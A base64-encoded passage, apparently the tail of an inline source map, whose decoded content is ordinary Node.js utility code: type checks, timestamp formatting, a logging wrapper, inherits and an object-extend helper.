JuIGFyZyA9PT0gbnVsbCB8fFxuICAgICAgICAgdHlwZW9mIGFyZyA9PT0gJ2Jvb2xlYW4nIHx8XG4gICAgICAgICB0eXBlb2YgYXJnID09PSAnbnVtYmVyJyB8fFxuICAgICAgICAgdHlwZW9mIGFyZyA9PT0gJ3N0cmluZycgfHxcbiAgICAgICAgIHR5cGVvZiBhcmcgPT09ICdzeW1ib2wnIHx8ICAvLyBFUzYgc3ltYm9sXG4gICAgICAgICB0eXBlb2YgYXJnID09PSAndW5kZWZpbmVkJztcbn1cbmV4cG9ydHMuaXNQcmltaXRpdmUgPSBpc1ByaW1pdGl2ZTtcblxuZXhwb3J0cy5pc0J1ZmZlciA9IHJlcXVpcmUoJy4vc3VwcG9ydC9pc0J1ZmZlcicpO1xuXG5mdW5jdGlvbiBvYmplY3RUb1N0cmluZyhvKSB7XG4gIHJldHVybiBPYmplY3QucHJvdG90eXBlLnRvU3RyaW5nLmNhbGwobyk7XG59XG5cblxuZnVuY3Rpb24gcGFkKG4pIHtcbiAgcmV0dXJuIG4gPCAxMCA/ICcwJyArIG4udG9TdHJpbmcoMTApIDogbi50b1N0cmluZygxMCk7XG59XG5cblxudmFyIG1vbnRocyA9IFsnSmFuJywgJ0ZlYicsICdNYXInLCAnQXByJywgJ01heScsICdKdW4nLCAnSnVsJywgJ0F1ZycsICdTZXAnLFxuICAgICAgICAgICAgICAnT2N0JywgJ05vdicsICdEZWMnXTtcblxuLy8gMjYgRmViIDE2OjE5OjM0XG5mdW5jdGlvbiB0aW1lc3RhbXAoKSB7XG4gIHZhciBkID0gbmV3IERhdGUoKTtcbiAgdmFyIHRpbWUgPSBbcGFkKGQuZ2V0SG91cnMoKSksXG4gICAgICAgICAgICAgIHBhZChkLmdldE1pbnV0ZXMoKSksXG4gICAgICAgICAgICAgIHBhZChkLmdldFNlY29uZHMoKSldLmpvaW4oJzonKTtcbiAgcmV0dXJuIFtkLmdldERhdGUoKSwgbW9udGhzW2QuZ2V0TW9udGgoKV0sIHRpbWVdLmpvaW4oJyAnKTtcbn1cblxuXG4vLyBsb2cgaXMganVzdCBhIHRoaW4gd3JhcHBlciB0byBjb25zb2xlLmxvZyB0aGF0IHByZXBlbmRzIGEgdGltZXN0YW1wXG5leHBvcnRzLmxvZyA9IGZ1bmN0aW9uKCkge1xuICBjb25zb2xlLmxvZygnJXMgLSAlcycsIHRpbWVzdGFtcCgpLCBleHBvcnRzLmZvcm1hdC5hcHBseShleHBvcnRzLCBhcmd1bWVudHMpKTtcbn07XG5cblxuLyoqXG4gKiBJbmhlcml0IHRoZSBwcm90b3R5cGUgbWV0aG9kcyBmcm9tIG9uZSBjb25zdHJ1Y3RvciBpbnRvIGFub3RoZXIuXG4gKlxuICogVGhlIEZ1bmN0aW9uLnByb3RvdHlwZS5pbmhlcml0cyBmcm9tIGxhbmcuanMgcmV3cml0dGVuIGFzIGEgc3RhbmRhbG9uZVxuICogZnVuY3Rpb24gKG5vdCBvbiBGdW5jdGlvbi5wcm90b3R5cGUpLiBOT1RFOiBJZiB0aGlzIGZpbGUgaXMgdG8gYmUgbG9hZGVkXG4gKiBkdXJpbmcgYm9vdHN0cmFwcGluZyB0aGlzIGZ1bmN0aW9uIG5lZWRzIHRvIGJlIHJld3JpdHRlbiB1c2luZyBzb21lIG5hdGl2ZVxuICogZnVuY3Rpb25zIGFzIHByb3RvdHlwZSBzZXR1cCB1c2luZyBub3JtYWwgSmF2YVNjcmlwdCBkb2VzIG5vdCB3b3JrIGFzXG4gKiBleHBlY3RlZCBkdXJpbmcgYm9vdHN0cmFwcGluZyAoc2VlIG1pcnJvci5qcyBpbiByMTE0OTAzKS5cbiAqXG4gKiBAcGFyYW0ge2Z1bmN0aW9ufSBjdG9yIENvbnN0cnVjdG9yIGZ1bmN0aW9uIHdoaWNoIG5lZWRzIHRvIGluaGVyaXQgdGhlXG4gKiAgICAgcHJvdG90eXBlLlxuICogQHBhcmFtIHtmdW5jdGlvbn0gc3VwZXJDdG9yIENvbnN0cnVjdG9yIGZ1bmN0aW9uIHRvIGluaGVyaXQgcHJvdG90eXBlIGZyb20uXG4gKi9cbmV4cG9ydHMuaW5oZXJpdHMgPSByZXF1aXJlKCdpbmhlcml0cycpO1xuXG5leHBvcnRzLl9leHRlbmQgPSBmdW5jdGlvbihvcmlnaW4sIGFkZCkge1xuICAvLyBEb24ndCBkbyBhbnl0aGluZyBpZiBhZGQgaXNuJ3QgYW4gb2JqZWN0XG4gIGlmICghYWRkIHx8ICFpc09iamVjdChhZGQpKSByZXR1cm4gb3JpZ2luO1xuXG4gIHZhciBrZXlzID0gT2JqZWN0LmtleXMoYWRkKTtcbiAgdmFyIGkgPSBrZXlzLmxlbmd0aDtcbiAgd2hpbGUgKGktLSkge1xuICAgIG9yaWdpbltrZXlzW2ldXSA9IGFkZFtrZXlzW2ldXTtcbiAgfVxuICByZXR1cm4gb3JpZ2luO1xufTtcblxuZnVuY3Rpb24gaGFzT3duUHJvcGVydHkob2JqLCBwcm9wKSB7XG4gIHJldHVybiBPYmplY3QucHJvdG90eXBlLmhhc093blByb3BlcnR5LmNhbGwob2JqLCBwcm9wKTtcbn1cbiJdfQ==
